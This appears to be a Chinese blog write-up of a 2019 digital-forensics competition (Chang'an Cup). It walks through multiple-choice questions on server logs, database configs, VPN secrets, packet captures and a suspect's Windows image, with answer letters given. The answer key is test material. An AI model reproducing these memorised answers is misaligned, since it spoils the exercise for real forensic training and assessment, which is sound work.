<p>21、网站目录所在的主机路径为下列选项中的哪个？（ A ） A./var/lib/docker/overlay2/cca977c8ca4a251023000285fbc8b4556636e1adc53cb012c84133a7b 857abfc/diff/home/vue2-element-touzi-admin B./var/lib/docker/overlay2/fd27756120785ef656c9211b6147ef5f38d6a9811006d85359458f7fa 8d45415/diff/home/vue2-element-touzi-admin C./var/lib/docker/overlay2/f405ba5e3f1f0e04a3585fbc95a47d13b4009dd9d599ac91015babebd 5a5ff9b/diff/var/www/ vue2-element-touzi-admin D./var/lib/docker/overlay2/d42b9a02aa87386b137242f691cb3e6303c4c0f3441419efb17ff550fd f5de28/diff/var/www/ vue2-element-touzi-admin</p>
</blockquote>
<p>22题同理</p>
<blockquote>
<p>22、网站日志的路径在哪？（格式：容器 ID：路径）（ C ） </p>
<p>A. 53766d68636f:/etc/nginx/logs/jrweb.log </p>
<p>B. 53766d68636f:/var/log/access.log </p>
<p>C. 16fc160060c1:/etc/nginx/logs/jrweb.log </p>
<p>D. 16fc160060c1:/var/log/access.log</p>
</blockquote>
<p>我们可以看看上一个题的日志文件</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016014902557.png" alt="image-20211016014902557"></p>
<p>在这里明显能看到猜解密码的行为，所以这个时候就是“案发当时”，此时的<code>IP</code>地址就是<code>192.168.184.128:8091</code>， 以及犯罪嫌疑人的IP地址为 <code>192.168.184.133</code></p>
<blockquote>
<p>23、案发当时，该服务器的原始 IP 地址是多少？（ D ）</p>
<p>A.192.168.160.89   B.192.168.184.100   C.192.168.120.111   D.192.168.184.128</p>
</blockquote>
<blockquote>
<p>26、从网站日志中，我们可以看到嫌疑人入侵服务器所使用的 IP 是（ C ）</p>
<p>A.192.168.184.1   B.192.168.160.89   C.192.168.184.133   D.192.168.160.169</p>
</blockquote>
<h3 id="数据库？"><a href="#数据库？" class="headerlink" title="数据库？"></a>数据库？</h3><h5 id="head-前多少行-文件-可以查看文件的前多少行信息"><a href="#head-前多少行-文件-可以查看文件的前多少行信息" class="headerlink" title="head -[前多少行] [文件] 可以查看文件的前多少行信息"></a>head -[前多少行] [文件] 可以查看文件的前多少行信息</h5><p>查询网站使用的是什么数据库：一般来说，项目都是从<code>github</code>上面<code>clone</code>下来的，所以根目录应该在<code>home</code>文件夹下，查看<code>README.md</code>文件，发现：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211014234817530.png" alt="image-20211014234817530"></p>
<blockquote>
<ol start="27">
<li>网站目录中网站的主配置文件是哪一个？(相对路径)（<strong>C</strong>）</li>
</ol>
<p><code>A./config/index.js    B./server/api.js    C./server/index.js    D./src/main.js</code></p>
<p>这里他说的是<code>node js</code>的配置文件，所以应该在<code>/server</code>目录下，对比三个文件，明显就是<code>C</code>选项</p>
</blockquote>
<p>查看 /server 目录下的db.js文件</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211015000537088.png" alt="image-20211015000537088"></p>
<p>其中可以看出使用的数据库为mongodb，第一个root为数据库的用户名，第二个root为数据库的密码，后面的192.168.184.129为数据库所在的服务器IP， 27017为数据库端口， 数据库名为tougu</p>
<blockquote>
<p>28、该网站使用的是什么数据库？（ C ）</p>
<p>A.mysql   B.oracle   C.mongodb   D.redis</p>
</blockquote>
<blockquote>
<p>29、所使用数据库的端口是多少？（ D ）</p>
<p>A.1521   B.3306   C.6379   D.27017</p>
</blockquote>
<blockquote>
<p>30、数据库所在服务器 IP 是多少？（ D ）</p>
<p>A.192.168.160.131   B.192.168.184.131   C.192.168.160.169   D.192.168.184.129</p>
</blockquote>
<blockquote>
<p>31、数据库的用户名是什么？（ A ）</p>
<p>A.root   B.tougu   C.admin   D.goose</p>
</blockquote>
<blockquote>
<p>32、数据库的密码是什么？（ D ）</p>
<p>A.123456   B.admin   C.goose   D.root</p>
</blockquote>
<blockquote>
<p>33、该网站所使用的数据库库名是什么？( B ) </p>
<p>A.root    B.tougu   C.admin   D.goose</p>
</blockquote>
<h5 id="输入-stat-文件名-可以查看文件时间状态"><a href="#输入-stat-文件名-可以查看文件时间状态" class="headerlink" title="输入 stat [文件名] 可以查看文件时间状态"></a>输入 <code>stat [文件名]</code> 可以查看文件时间状态</h5><h5 id="输入-more-bash-history-查看历史操作记录"><a href="#输入-more-bash-history-查看历史操作记录" class="headerlink" title="输入 more .bash_history 查看历史操作记录"></a>输入 <code>more .bash_history</code> 查看历史操作记录</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211015001337208.png" alt="image-20211015001337208"></p>
<p>可以知道黑客曾经对.bash_history目录进行加密</p>
<blockquote>
<p>34、在案发时，黑客对该服务器某个文件/目录进行了加密，请问是哪个文件/目录？（ A ） A.<del>/.bash_history   B./var/log/   C./etc/ssh/sshd_config   D.</del>/ runit-agent.txt</p>
</blockquote>
<h2 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h2><h5 id="输入-find-name-名字-可以搜索所需要的配置文件（-conf结尾）或-日志文件（-log结尾）"><a href="#输入-find-name-名字-可以搜索所需要的配置文件（-conf结尾）或-日志文件（-log结尾）" class="headerlink" title="输入 find / -name [名字] 可以搜索所需要的配置文件（.conf结尾）或 日志文件（.log结尾）"></a>输入 <code>find / -name [名字]</code> 可以搜索所需要的配置文件（.conf结尾）或 日志文件（.log结尾）</h5><blockquote>
<p>35、该数据库服务器使用数据库的安装路径在哪？（ D ）</p>
<p>A. /etc/mysql/   B. /home/redis/   C. /etc/mongo/   D. /var/lib/mongo/</p>
</blockquote>
<blockquote>
<p>36、数据库的配置文件的路径？（ C ）</p>
<p>A./var/lib/mongo/mongo.conf </p>
<p>B./var/lib/mongo/mongod.conf </p>
<p>C./etc/mongod.conf </p>
<p>D./home/redis/redis.conf</p>
</blockquote>
<blockquote>
<p>37、数据库的日志文件路径在哪里？（ C ）</p>
<p>A./etc/redis.log </p>
<p>B./var/log/mongodb.log </p>
<p>C./var/log/mongodb/mongod.log </p>
<p>D./var/lib/mongo/mongo.log</p>
</blockquote>
<h5 id="查看前端代码"><a href="#查看前端代码" class="headerlink" title="查看前端代码"></a>查看前端代码</h5><p>因为读取用户的注册信息在前端，所以我们回到前端（检材1）来看看代码：</p>
<p>取证大师实时搜索api.js(我也不知道为什么搜这个doge)，打开可以看到</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016113742936.png" alt="image-20211016113742936"></p>
<p>说明该数据库中网站用户表里的密码未采用加密手段，而是直接判断</p>
<blockquote>
<p>39、该数据库中网站用户表里的密码字段加密方式是（ A ）</p>
<p>A.未加密</p>
<p>B.双重 MD5</p>
<p>C.MD5 加 salt</p>
<p>D.MD5</p>
</blockquote>
<h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h2><p>火眼仿真帮我们把root的密码设置为123456，于是我们直接登陆终端，在控制台中输入<code>history</code></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016235238300.png" alt="image-20211016235238300"></p>
<p>我们看到出现了多次pptpd关键字，故可知采用了pptpd协议</p>
<blockquote>
<p>45、该服务器所使用的 VPN 软件，采用了什么协议（ B ） </p>
<p>A.L2TP    B.PPTP    C.IPSec    D.NFS</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016235430504.png" alt="image-20211016235430504"></p>
<p>设置了多次时区，最后一次设置为 Asia/Dhaka</p>
<p>附：可以输入<code>date -R</code>获取当前为+0600，换算较麻烦，可以作为验证</p>
<blockquote>
<p>46、该服务器的时区为（ D ） </p>
<p>A. Asia/ShangHai    B. Asia/Tokyo    C. Asia/Bangkok    D. Asia/Dhaka</p>
</blockquote>
<p>老办法，在取证大师里实时搜索即可</p>
<blockquote>
<p>47、该服务器中对 VPN 软件配置的 option 的文件位置在哪里？（ A ） </p>
<p>A. /etc/ppp/options.pptpd </p>
<p>B./var/lib/vpn/options.pptpd </p>
<p>C./etc/ipsec/options.ipsecd </p>
<p>D./etc/l2tp/options.l2tpd</p>
</blockquote>
<p>日志文件一般存储在<code>/var/log</code>文件夹里，分别打开各个日志文件，发现wtmp存在日志文件</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017000952927.png" alt="image-20211017000952927"></p>
<blockquote>
<p>48、VPN 软件开启了写入客户端的连接与断开，请问写入的文件是哪个？（ A ） </p>
<p>A.wtmp    B.btmp    C.ftmp    D.tmp</p>
</blockquote>
<p>上题已经知道了VPN软件配置的option文件位置，不妨打开来看看</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017001609219.png" alt="image-20211017001609219"></p>
<p>找到了pptpd.conf配置文件的位置，顺藤摸瓜，打开配置文件看看，发现了推荐ip范围</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017001749389.png" alt="image-20211017001749389"></p>
<blockquote>
<p>49、VPN 软件客户端被分配的 IP 范围是（ B ） </p>
<p>A.192.168.184.1-192.168.184.11 </p>
<p>B.192.168.184.12-192.168.184.18 </p>
<p>C.192.168.184.19-192.168.184.26 </p>
<p>D.192.168.184.27-192.168.184.35</p>
</blockquote>
<p>还找到了VPN软件的日志路径（笑）</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017001651848.png" alt="image-20211017001651848"></p>
<blockquote>
<p>50、由 option 文件可以知道，option 文件配置了 VPN 软件的日志路径为（ D ） </p>
<p>A./var/lib/logs/    B./etc/logs/    C./var/log/pptp/    D./var/log/</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017002444421.png" alt="image-20211017002444421"></p>
<p>根据题意，直接到所在路径打开文件比对即可</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017002508598.png" alt="image-20211017002508598"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017002521633.png" alt="image-20211017002521633"></p>
<p>etc/ppp/chap-secrets 文件如图所示</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017002604641.png" alt="image-20211017002604641"></p>
<p>etc/ppp/pap-secrets 文件如图所示</p>
<blockquote>
<p>51、VPN 软件记录了客户端使用的名称和密码，记录的文件是（ C ） </p>
<p>A. /etc/l2tp/chap-secrets </p>
<p>B. /etc/ipsec/pap-secrets </p>
<p>C. /etc/ppp/chap-secrets </p>
<p>D. /etc/ppp/pap-secrets</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017002930685.png" alt="image-20211017002930685"></p>
<p>由于北京时间（+08取证大师默认使用）比该服务器的市区（+06）早两个小时，所以需要将时间减去两个小时整</p>
<blockquote>
<p>52、在服务器时间 2019-07-02_12:08:27 登陆过 VPN 客户端的用户名是哪个？（ A ） </p>
<p>A. root    B. vpn1    C. vpn2    D. vpn3</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017003105700.png" alt="image-20211017003105700"></p>
<blockquote>
<p>53、上题用户登陆时的客户 IP 是什么？（ D ） </p>
<p>A. 192.168.184.133    B. 172.16.81.101    C. 192.168.184.134    D. 192.168.43.238</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017003553008.png" alt="image-20211017003553008"></p>
<blockquote>
<p>54、通过 IP172.16.80.188 登陆 VPN 服务器的用户名是哪个？（ B ）</p>
<p>A. root    B. vpn1    C. vpn2    D. vpn3</p>
</blockquote>
<blockquote>
<p>55、上题用户登陆 VPN 服务器的北京时间是（ D ） </p>
<p>A. 2019-07-11_10:46:50 </p>
<p>B. 2019-07-11_11:30:36 </p>
<p>C. 2019-07-13_14:15:37 </p>
<p>D. 2019-07-13_16:15:37</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017004214836.png" alt="image-20211017004214836"></p>
<p>取证大师搜索<code>network.cap</code>得到Bash的历史记录，发现曾经的操作与ens33有关</p>
<blockquote>
<p>56、该服务器曾被进行过抓包，请问 network.cap 是对哪个网卡进行抓包的抓包文件（ B ） A.eth0    B.ens33    C.ens37    D.ens160</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017004449842.png" alt="image-20211017004449842"></p>
<p>同理，搜索ens37，得到Bash的操作记录，曾对netwoek1.cap和net0713-1.cap进行过抓包</p>
<p>题目要求保存下来，即未被删除，没有被rm移除</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017004708378.png" alt="image-20211017004708378"></p>
<p>network1.cap没有保存下来</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017004755692.png" alt="image-20211017004755692"></p>
<p>net0713-1.cap被保存下来了</p>
<blockquote>
<p>57、对 ens37 网卡进行抓包产生的抓包文件并保存下来的是哪个？（ D ） </p>
<p>A. network.cap    B. network1.cap    C. net0713.cap    D. net0713-1.cap</p>
</blockquote>
<p>我们从上面的信息知道net0713-1.cap已经被保存下来，并且能找到该文件</p>
<p>以cap结尾的文件我们需要用<strong>WireShark</strong>来打开（个人对该工具理解还较为浅显，需要加深理解）</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017011017220.png" alt="image-20211017011017220"></p>
<p>解题并不是因为看懂了，而是四个选项中仅仅出现了172.16.80.62，光是凭侥幸而得出结论，哭哭了。</p>
<p>下面引用BB大佬的话</p>
<blockquote>
<p>但是为什么第一个数据包里面就没有答案呢？？？这是因为该<code>vpn</code>服务器为双网卡，对内IP为<code>192.168.184.133</code>，具备对检材1（<code>192.168.184.128</code>）和检材2（<code>192.168.184.129</code>）访问权限，出口/服务端IP为<code>172.16.80.92</code>。</p>
</blockquote>
<blockquote>
<p>58、从保存的数据包中分析可知，出口的 IP 为（ A ）</p>
<p>A. 172.16.80.92 </p>
<p>B. 172.16.81.101 </p>
<p>C. 172.16.81.188 </p>
<p>D. 172.16.80.133</p>
</blockquote>
<h2 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h2><p>老朋友了，选择检材右键哈希值计算SHA256，即可得到答案（误！！！，所求得的为镜像的SHA256值！！！）</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017012546445.png" alt="image-20211017012546445"></p>
<p>80GB计算SHA256用了十几分钟（快哭了，竟然还算错了，题目要求的是文件的SHA256）</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017014012553.png" alt="image-20211017014012553"></p>
<blockquote>
<p>59、计算“检材 4.E01”文件的 sha256 值（ C ） </p>
<p>A. 58a4ab5ee3dc4c4a279fa8287ed7dce315090512fa87127f8f9278c7972366c5 </p>
<p>B. 58a4ab5ee3dc4c4a279fa8287ed7dce315090512fa87127f8f9278c7972366c6 </p>
<p>C. e6e47e210bd56c7071ce73ab5523736120071d0f3da5335936d7beb25c3914cd </p>
<p>D. 1e646dec202c96b72f13cc3cf224148fc4e19d6faaaf76efffc31b1ca2cdd200</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017012700260.png" alt="image-20211017012700260"></p>
<p>取证大师的案例概览好像只对WINDOWS系统有效，并且显示的信息十分详细，就连底裤都看干净了（狗头）</p>
<blockquote>
<p>60、请分析该检材的操作系统版本（ A ）</p>
<p>A. Windows 10 Education </p>
<p>B. Windows 10 Home </p>
<p>C. Windows 10 Pro </p>
<p>D. Windows 10 Enterprise</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017014255144.png" alt="image-20211017014255144"></p>
<blockquote>
<p>61、找出该系统用户最后一次登陆时间：（ C ） </p>
<p>A. 2019-07-14 10:50:02  </p>
<p>B. 2019-07-14 10:10:02 </p>
<p>C. 2019-07-14 10:40:02  </p>
<p>D. 2019-07-14 10:30:02</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017013544571.png" alt="image-20211017013544571"></p>
<blockquote>
<p>62、找出该系统最后一次正常关机时间：（ C ） </p>
<p>A.2019-07-14 17:30:05 </p>
<p>B.2019-07-14 10:30:05  </p>
<p>C.2019-07-14 11:30:05  </p>
<p>D.2019-07-14 12:30:05</p>
</blockquote>
<p>取证大师已经在证据文件里帮我们分类好了常用文件夹，点击桌面，发现有三个Desktop文件夹，依次打开，发现题目所描述的txt文件，计算SHA256值</p>
<blockquote>
<p>63、请计算检材桌面上文本文件的 sha256 值：（ A ） A.58a4ab5ee3dc4c4a279fa8287ed7dce315090512fa87127f8f9278c7972366c5  B.58a4ab5ee3dc4c4a279fa8287ed7dce315090512fa87127f8f9278c7972366c6 C.58a4ab5ee3dc4c4a279fa8287ed7dce315090512fa87127f8f9278c7972366c7  D.58a4ab5ee3dc4c4a279fa8287ed7dce315090512fa87127f8f9278c7972366c8</p>
</blockquote>
<p>FMP -&gt; 自动取证 -&gt; 检材4.E01 -&gt; 系统痕迹 -&gt; 安装软件 ，下面的分支依次点开查看时间</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017014836965.png" alt="image-20211017014836965"></p>
<blockquote>
<p>64、该系统于 2019 年 7 月 13 日安装的软件为：（ A ） </p>
<p>A.Eraser     B.Putty    C.Xftp     D.Xshell</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017015202369.png" alt="image-20211017015202369"></p>
<p>光是通过WINRAR的使用记录查找的话，没有显示时间，看起来很难受</p>
<p>于是换一个思路，通过FMP的WIN10时间轴，定位到2019.07.13 17:52:19，可以看到操作了WINRAR程序</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017015339856.png" alt="image-20211017015339856"></p>
<blockquote>
<p>65、找出该嫌疑人于 2019-07-13 17:52:19 时，使用 WinRAR 工具访问了_____文件：（ D ） A.navicat11.zip     B.we.tar.gz    C.test2-master.zip     D.BitLocker.rar</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017015732164.png" alt="image-20211017015732164"></p>
<p>其他的软件我都认识，只不过这个xftp比较奇怪，很容易联想到Xshell（错误！！！）</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017120946484.png" alt="image-20211017120946484"></p>
<p>在应用程序使用痕迹中<strong>仔细检索</strong>，发现了foxmail.exe曾在该时间使用</p>
<blockquote>
<p><strong>66、系统于 2019-07-13 17:53:45 时运行了___程序：（ D ）</strong> </p>
<p><strong>A.regedit.exe     B.WinRAR.exe    C.Xshell.exe     D.Foxmail.exe</strong></p>
</blockquote>
<p>文件疑似执行了删除操作，所以实时搜索找不到，本来想尝试原始数据搜索，但是特别耗时间，故而放弃。</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017020343616.png" alt="image-20211017020343616"></p>
<p>翻翻资源管理器痕迹，无意中发现了这个文件夹，时间上恰为下载完成后解压得到的文件夹（不严谨）</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017020904302.png" alt="image-20211017020904302"></p>
<p>嘿嘿嘿，挂载到本地磁盘，然后共享文件获取访问权限，来到了下载这里，得到了确切的下载时间</p>
<blockquote>
<p>67、文件 test2-master.zip 是什么时间下载到本机的：（ D ） </p>
<p>A.2019-07-13 14:21:01     </p>
<p>B.2019-07-13 17:22:01   </p>
<p>C.2019-07-13 15:23:01  </p>
<p>D.2019-07-13 16:20:01</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017021833528.png" alt="image-20211017021833528"></p>
<p>通过在Google Chrome的下载记录发现曾经使用这个软件下载文件</p>
<blockquote>
<p>68、文件 test2-master.zip 是使用什么工具下载到本地的：（ A ） </p>
<p>A.Chrome     B.Internet Explorer    C.edge     D.迅雷</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017123416942.png" alt="image-20211017123416942"></p>
<p>可以从上面的信息看到，文件创建时间为00秒，经过十五秒后文件修改，可以理解为下载文件从创建新文件到下载信息完成。</p>
<blockquote>
<p>70、嫌疑人通过远程连接到 128 服务器，下载了什么文件到本机：（ B ） </p>
<p>A.web.tar.gz     B.we.tar.gz    C.home.tar.gz     D.wwwroot.tar.gz</p>
</blockquote>
<blockquote>
<p>71、承接上一题，下载该文件用了多长时间：（ C ） </p>
<p>A.10 秒     B.20 秒    C.15 秒     D.25 秒</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017124656586.png" alt="image-20211017124656586"></p>
<p>我们在检材4中没有发现we.tar.gz，应该是被删掉了，不过实时搜索的时候发现在检材一中发现了该文件，可以推断出该电脑与服务器曾经进行过连接操作。</p>
<blockquote>
<p>72、请计算该下载文件的 sha256 值：（ D ） A.077d894557edf44e5792e0214e0f1c46b9b615be11ac306bcce2af9d666f47d8  B.077d894557edf44e5792e0214e0f1c46b9b615be11ac306bcce2af9d666f47d7  C.077d894557edf44e5792e0214e0f1c46b9b615be11ac306bcce2af9d666f47d6  D.077d894557edf44e5792e0214e0f1c46b9b615be11ac306bcce2af9d666f47d5</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017121904622.png" alt="image-20211017121904622"></p>
<p><strong>国际移动设备识别码</strong>（<strong>International Mobile Equipment Identity</strong>，<strong>IMEI</strong>），即通常所说的手机序列号、手机“串号”，用于在移动电话网络中识别每一部独立的手机等移动通信设备，相当于移动电话的身份证。</p>
<blockquote>
<p>73、请分析并提取，嫌疑人所用的手机的 IMEI 号码：（ C ） </p>
<p>A.352021062748965     B.352021062748966    C.352021062748967      D.352021062748968</p>
</blockquote>
<p>对于以下几题，在电脑里没有相关的社交软件的使用记录，故可推断出信息极有可能被保存在手机备份中。</p>
<p>我们在火眼证据分析中找到手机备份，然后添加到检材，然后分析，密码？？试一下检材4桌面上的``niuroumian6`！对了！</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017193556301.png" alt="image-20211017193556301"></p>
<blockquote>
<p>74、嫌疑人是通过何种方式联系到售卖恶意程序的卖家的：（ B ）</p>
<p> A.微信     B.QQ    C.短信     D.邮件</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017193623009.png" alt="image-20211017193623009"></p>
<blockquote>
<p>75、嫌疑人和卖家的资金来往是通过何种方式：（ A ） </p>
<p>A.微信     B.QQ    C.银行转账     D.支付宝</p>
</blockquote>
<blockquote>
<p>76、嫌疑人在犯罪过程中所使用的 QQ 账号为：（ A ）</p>
<p> A.1649840939     B.1137588348     C.364505251     D.1722629449</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017194124463.png" alt="image-20211017194124463"></p>
<blockquote>
<p>77、卖家所使用的微信账号 ID 为：（ C ） </p>
<p>A.refrain_C     B.flame_guan    C.chao636787     D.sword19880521</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017194802500.png" alt="image-20211017194802500"></p>
<p>查找edge的下载记录时，发现两个文件没有大小，但是在左下角有记录，发现是卖家所给的站点，故可推断下载了两个文件，并且下载地点时D盘</p>
<blockquote>
<p>78、嫌疑人下载了几个恶意程序到本机：（ B ） </p>
<p>A.1     B.2    C.3     D.4</p>
</blockquote>
<blockquote>
<p>79、恶意程序被嫌疑人保存在什么位置：（ D ） </p>
<p>A.D:/DOWNLOAD     B.C:/USER    C.C:/     D.D:/</p>
</blockquote>
<blockquote>
<p>80、恶意程序是使用什么工具下载到本地的：（ C ） </p>
<p>A.Chrome     B.Internet Explorer    C.edge     D.迅雷</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211017195754325.png" alt="image-20211017195754325"></p>
<p>看着有种莫名的喜感</p>
<blockquote>
<p>81、嫌疑人是什么时间开始对受害者实施诈骗的：（ C ） </p>
<p>A.2019-07-13 19:14:44  </p>
<p>B.2019-07-13 19:24:44 </p>
<p>C.2019-07-13 19:04:44  </p>
<p>D.2019-07-13 19:44:44</p>
</blockquote>
<hr>
<h3 id="干不动了，下面放的是BB的题解，我这种菜鸟就只能走到这里了。。。"><a href="#干不动了，下面放的是BB的题解，我这种菜鸟就只能走到这里了。。。" class="headerlink" title="干不动了，下面放的是BB的题解，我这种菜鸟就只能走到这里了。。。"></a>干不动了，下面放的是BB的题解，我这种菜鸟就只能走到这里了。。。</h3><p>在电脑里面的备份平台里面有一台虚拟机，搞出来，有密码？？？搞他！我们先<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcl0421/p/9227805.html">修改密码</a>，在<code>/home/admin888/fund/</code>文件夹下发现<code>sqlite</code>数据库，我们导出来~</p>
<blockquote>
<p><code>$ scp root@192.168.247.155:/home/admin888/fund/db.sqlite3 ./db.sqlite3</code></p>
<p><code>$ python3 -m http.server 2021</code></p>
</blockquote>
<p>然后根据手机号定位受害人是赵昊，数据库里面查看银行卡号：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201107154313948.png" alt="image-20201107154313948"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201107154258903.png" alt="image-20201107154258903"></p>
<blockquote>
<ol start="83">
<li><p>请综合分析，嫌疑人第一次入侵目标服务器的行为发生在：（<strong>C</strong>）</p>
<p><code> A. 2019-07-13 16:17:30     B. 2019-07-13 16:17:32     C. 2019-07-13 16:17:35     D. 2019-07-13 16:17:38</code></p>
</li>
</ol>
</blockquote>
